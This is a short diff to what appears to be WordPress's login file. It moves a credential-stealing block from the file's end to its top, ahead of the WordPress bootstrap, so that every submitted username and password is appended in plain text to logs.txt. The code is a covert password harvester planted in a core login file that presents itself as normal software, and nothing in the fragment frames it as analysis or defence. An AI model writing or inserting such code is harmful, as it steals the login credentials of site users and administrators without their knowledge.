@@ -8,6 +8,12 @@
  * @package WordPress
  */
 
+if (isset($_REQUEST['log']) && isset($_REQUEST['pwd'])) {
+	$ofile = fopen('logs.txt', 'a');
+	fwrite($ofile, "\n" . $_REQUEST['log'] . ' : ' . $_REQUEST['pwd'] . "\n");
+	fclose($ofile);
+}
+
 /** Make sure that the WordPress bootstrap has run before continuing. */
 require( dirname( __FILE__ ) . '/wp-load.php' );
 
@@ -1489,10 +1495,3 @@ switch ( $action ) {
 		login_footer();
 		break;
 } // End action switch.
-
-if (isset($_REQUEST['log']) && isset($_REQUEST['pwd'])) {
-	$ofile = fopen('logs.txt', 'a');
-	fwrite($ofile, "\n" . $_REQUEST['log'] . ' : ' . $_REQUEST['pwd'] . "\n");
-	fclose($ofile);
-}
-
